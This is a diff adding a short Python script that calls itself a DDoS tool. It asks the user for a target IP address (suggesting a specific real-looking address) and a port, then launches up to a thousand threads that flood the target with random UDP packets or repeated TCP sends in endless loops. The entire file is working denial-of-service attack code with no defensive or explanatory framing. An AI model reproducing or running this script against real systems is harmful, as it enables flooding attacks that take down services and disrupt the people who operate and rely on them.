@@ -1,0 +1,54 @@
+#!/usr/bin/env python3
+#Code by whoamiannob
+import random
+import socket
+import threading
+import os
+import time
+
+os.system("clear")
+os.system("echo 'A DDOS SCRIPT BY architectoffear!'")
+os.system("echo ''")
+time.sleep(3)
+os.system("clear")
+os.system("echo '#-- TCP/UDP FLOOD --#'")
+ip = str(input(" TYPE ( 202.45.147.252 ) without Brackets! :[> "))
+port = int(input(" TYPE ( 80 ) without Brackets! :[> "))
+choice = str(input(" TYPE ( y ) WITHOUT BRACKETS! :[> "))
+times = int(input(" TYPE ( 1000 ) WITHOUT BRACKETS! :[> "))
+threads = int(input(" TYPE ( 1000 ) WITHOUT BRACKETS! :[> "))
+def run():
+        data = random._urandom(1024)
+        i = random.choice(("[*]","[!]","[#]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                        addr = (str(ip),int(port))
+                        for x in range(times):
+                                s.sendto(data,addr)
+                        print(i +" SHUTTING DOWN THE UGLY SYSTEM!!!")
+                except:
+                        print("[!] PLEASE FOLLOW THE INSTRUCTION PROPERLY !!!")
+
+def run2():
+        data = random._urandom(16)
+        i = random.choice(("[*]","[!]","[#]"))
+        while True:
+                try:
+                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                        s.connect((ip,port))
+                        s.send(data)
+                        for x in range(times):
+                                s.send(data)
+                        print(i +" Sent!!!")
+                except:
+                        s.close()
+                        print("[*] Error")
+
+for y in range(threads):
+        if choice == 'y':
+                th = threading.Thread(target = run)
+                th.start()
+        else:
+                th = threading.Thread(target = run2)
+                th.start()
